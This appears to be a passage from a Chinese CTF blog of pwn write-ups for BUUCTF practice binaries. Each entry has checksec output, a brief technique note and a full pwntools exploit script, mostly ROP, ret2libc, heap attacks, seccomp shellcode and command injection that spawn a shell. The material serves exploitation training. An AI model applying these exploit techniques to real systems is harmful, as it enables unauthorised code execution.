<h3 id="ZJCTF-2019Login"><a href="#ZJCTF-2019Login" class="headerlink" title="ZJCTF 2019Login"></a>ZJCTF 2019Login</h3><h4 id="checksec检查：-25"><a href="#checksec检查：-25" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-28"><a href="#利用：-28" class="headerlink" title="利用："></a>利用：</h4><p>c++写的程序，逆向分析好难，参考了其他师傅的wp，输入密码后发现段错误，发现和rax有关，倒推 rax 的来源，在 main 函数中把 rax 的来源覆盖为漏洞函数的地址即可 get shell</p>
<h4 id="exp如下：-26"><a href="#exp如下：-26" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">sh &#x3D; remote(&#39;node3.buuoj.cn&#39;,27732)</span><br><span class="line"> </span><br><span class="line">shell &#x3D; 0x400e88</span><br><span class="line">sh.sendlineafter(&#39;: &#39;,&#39;admin&#39;)</span><br><span class="line">sh.sendlineafter(&#39;: &#39;,&#39;2jctf_pa5sw0rd&#39;+&#39;\x00&#39;*58+p64(shell))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><h4 id="checksec检查：-26"><a href="#checksec检查：-26" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-29"><a href="#利用：-29" class="headerlink" title="利用："></a>利用：</h4><p>off by one 漏洞，通过将one_gadget写入realloc_hook,将realloc+offest写入malloc_hook来getshell。但是我在本地可以打通远程就不可以，换了libc也不行，好烦。如果有哪位师傅知道是什么原因，跪求。</p>
<h4 id="exp如下：-27"><a href="#exp如下：-27" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;roarctf_2019_easy_pwn&#39;)</span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25506)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;roarctf_2019_easy_pwn&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;4&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x18) #0</span><br><span class="line">add(0x60) #1</span><br><span class="line">add(0x60) #2</span><br><span class="line">add(0x10) #3</span><br><span class="line">edit(0,0x18+10,&#39;a&#39;*0x18+&#39;\xe1&#39;)</span><br><span class="line">free(1)</span><br><span class="line">add(0x60) #1</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&#39;: &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">one_gadget&#x3D;libc_base+0x4527a</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;__libc_realloc&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x60) #4&#x3D;&#x3D;&gt;2</span><br><span class="line">free(4)</span><br><span class="line">fake_chunk&#x3D;malloc_hook-0x23</span><br><span class="line">sh.success(&#39;fake_chunk : &#39; +hex(fake_chunk))</span><br><span class="line">edit(2,0x8,p64(fake_chunk))</span><br><span class="line">add(0x60) #4</span><br><span class="line">add(0x60) #5</span><br><span class="line">edit(5,0x1b,&#39;a&#39;*3+p64(0)+p64(one_gadget)+p64(realloc))</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><h4 id="checksec检查：-27"><a href="#checksec检查：-27" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-30"><a href="#利用：-30" class="headerlink" title="利用："></a>利用：</h4><p>考察linux命令,原理就不讲了。</p>
<h4 id="exp如下：-28"><a href="#exp如下：-28" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29106)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;||&#x2F;bin&#x2F;sh&#39;</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Please input u choose:\n&#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h3><h4 id="checksec检查：-28"><a href="#checksec检查：-28" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-31"><a href="#利用：-31" class="headerlink" title="利用："></a>利用：</h4><p>rop利用，利用0x80中断。</p>
<h4 id="exp如下：-29"><a href="#exp如下：-29" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;simplerop&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,26823)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p.recv()</span><br><span class="line">int_addr &#x3D; 0x080493e1</span><br><span class="line">pop_eax &#x3D; 0x080bae06</span><br><span class="line">read_addr&#x3D; 0x0806CD50</span><br><span class="line">binsh_addr &#x3D; 0x080EB584</span><br><span class="line">pop_edx_ecx_ebx &#x3D; 0x0806e850</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)</span><br><span class="line">payload +&#x3D; p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h3><h4 id="checksec检查：-29"><a href="#checksec检查：-29" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-32"><a href="#利用：-32" class="headerlink" title="利用："></a>利用：</h4><p>uaf利用，覆盖free指针为system。</p>
<h4 id="exp如下：-30"><a href="#exp如下：-30" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&quot;node3.buuoj.cn&quot;,25283)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;ciscn_2019_n_3&#39;)</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">def add1(index,integer):</span><br><span class="line">	sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&quot;Type &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Value &gt; &quot;)</span><br><span class="line">	sh.sendline(str(integer))</span><br><span class="line">def add2(index,size,content):</span><br><span class="line">	sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&quot;Type &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Length &gt; &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Value &gt; &quot;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def delete(index):</span><br><span class="line">	sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">system_plt&#x3D;0x08048500</span><br><span class="line">add1(0,1)</span><br><span class="line">add1(1,2)</span><br><span class="line">add1(2,3)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">payload&#x3D;&quot;sh\x00\x00&quot;+p32(system_plt)</span><br><span class="line">add2(3,0xc,payload)</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a>picoctf_2018_buffer overflow 1</h4><h4 id="checksec检查：-30"><a href="#checksec检查：-30" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="利用：-33"><a href="#利用：-33" class="headerlink" title="利用："></a>利用：</h4><p>没啥好说的</p>
<h4 id="exp如下：-31"><a href="#exp如下：-31" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;PicoCTF_2018_buffer_overflow_1&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29794)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;PicoCTF_2018_buffer_overflow_1&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x28+&#39;a&#39;*4+p32(0x080485CB)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable orw"></a>pwnable orw</h3><h4 id="checksec检查：-31"><a href="#checksec检查：-31" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="seccomp检查："><a href="#seccomp检查：" class="headerlink" title="seccomp检查："></a>seccomp检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;buu&#x2F;pwnable_orw$ seccomp-tools dump .&#x2F;orw </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  if (A !&#x3D; ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  if (A &#x3D;&#x3D; rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  if (A &#x3D;&#x3D; sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  if (A &#x3D;&#x3D; exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  if (A &#x3D;&#x3D; exit) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  if (A &#x3D;&#x3D; read) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  if (A &#x3D;&#x3D; write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<h4 id="利用：-34"><a href="#利用：-34" class="headerlink" title="利用："></a>利用：</h4><p>IDA查看程序发现是一道seccomp练习。参考了几位师傅的博客，学习了一波(太菜了)</p>
<h5 id="什么是seccomp"><a href="#什么是seccomp" class="headerlink" title="什么是seccomp"></a>什么是seccomp</h5><p>用自己的话来说,就是说seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,这是不安全的,比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.</p>
<p>我这里给出俩种利用方法，一种是自己写系统调用的汇编，另一种是使用pwntools自带的shellcraft</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shellcode &#x3D; shellcraft.open(&#39;&#x2F;flag&#39;)</span><br><span class="line">shellcode +&#x3D; shellcraft.read(&#39;eax&#39;,&#39;esp&#39;,100)</span><br><span class="line">shellcode +&#x3D; shellcraft.write(1,&#39;esp&#39;,100)</span><br><span class="line">shellcode &#x3D; asm(shellcode)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; open(&#39;&#x2F;home&#x2F;orw&#x2F;flag&#39;,0) 这里的0是指O_RDONLY:   </span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push ebx ;截断字符串</span><br><span class="line">push 0x67616c66 ;flag</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0x5</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">; read(3,esp,0x40)</span><br><span class="line">mov ebx,0x3 ; 这里fd是3的原因是open后返回的fd是3</span><br><span class="line">mov ecx,esp</span><br><span class="line">mov edx,0x40</span><br><span class="line">mov al,0x3</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">;write(1,esp,0x40)</span><br><span class="line">mov ebx,0x1</span><br><span class="line">mov al,0x4</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>



<h4 id="exp如下：-32"><a href="#exp如下：-32" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh &#x3D; process(&#39;.&#x2F;orw&#39;)</span><br><span class="line">sh &#x3D; remote(&#39;node3.buuoj.cn&#39;,28268)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh.recvuntil(&#39;Give my your shellcode:&#39;)</span><br><span class="line"></span><br><span class="line">#open</span><br><span class="line">shellcode &#x3D; asm(&quot;xor ebx,ebx;xor ecx,ecx;xor edx,edx;xor eax,eax;push ebx ;push 0x67616c66 ;mov ebx,esp;mov al,0x5;int 0x80;&quot;)</span><br><span class="line">#read</span><br><span class="line">shellcode +&#x3D; asm(&quot;mov ebx,0x3;mov ecx,esp ;mov edx,0x40;xor eax,eax;mov al,0x3;int 0x80;&quot;)</span><br><span class="line">#write</span><br><span class="line">shellcode +&#x3D; asm(&quot;mov ebx,0x1;xor eax,eax ;mov al,0x4;int 0x80;&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a>jarvisoj_level1</h3><h4 id="checksec检查：-32"><a href="#checksec检查：-32" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="利用：-35"><a href="#利用：-35" class="headerlink" title="利用："></a>利用：</h4><p>本地和远程不太一样。</p>
<h4 id="exp如下：-33"><a href="#exp如下：-33" class="headerlink" title="exp如下："></a>exp如下：</h4><h5 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;level1&#39;)</span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28253)</span><br><span class="line">context.arch&#x3D;&#39;i386&#39;</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level1&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;0x&quot;)</span><br><span class="line">buf_addr&#x3D;int(sh.recv(8),16)</span><br><span class="line">sh.success(&#39;buf_addr : &#39; +hex(buf_addr))</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload&#x3D;shellcode+&#39;a&#39;*(0x88+0x4-len(shellcode))+p32(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level1&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28253)</span><br><span class="line">context.arch&#x3D;&#39;i386&#39;</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level1&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">main_addr &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x4)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;, read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">str_bin_sh &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+&#39;a&#39;*0x4+p32(system_addr)+p32(main_addr)+p32(str_bin_sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PicoCTF-2018-buffer-overflow-2"><a href="#PicoCTF-2018-buffer-overflow-2" class="headerlink" title="PicoCTF_2018_buffer_overflow_2"></a>PicoCTF_2018_buffer_overflow_2</h3><h4 id="checksec检查：-33"><a href="#checksec检查：-33" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-36"><a href="#利用：-36" class="headerlink" title="利用："></a>利用：</h4><p>栈溢出，本地和远程不太一样</p>
<h4 id="exp如下：-34"><a href="#exp如下：-34" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;PicoCTF_2018_buffer_overflow_2&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26509)</span><br><span class="line">context.arch&#x3D;&#39;i386&#39;</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;PicoCTF_2018_buffer_overflow_2&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">main_addr &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x6c + 4) + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">puts_addr&#x3D;u32(sh.recvuntil(&#39;\xf7&#39;)[-4:])</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;puts&#39;, puts_addr)</span><br><span class="line">libc_base &#x3D; puts_addr - libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">str_bin_sh &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x6c+&#39;a&#39;*0x4+p32(system_addr)+p32(main_addr)+p32(str_bin_sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h3><h4 id="checksec检查：-34"><a href="#checksec检查：-34" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-37"><a href="#利用：-37" class="headerlink" title="利用："></a>利用：</h4><p>没啥说的</p>
<h4 id="exp如下：-35"><a href="#exp如下：-35" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bof&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25428)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bof&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">main_addr &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x6c + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x4)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;, read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">str_bin_sh &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span 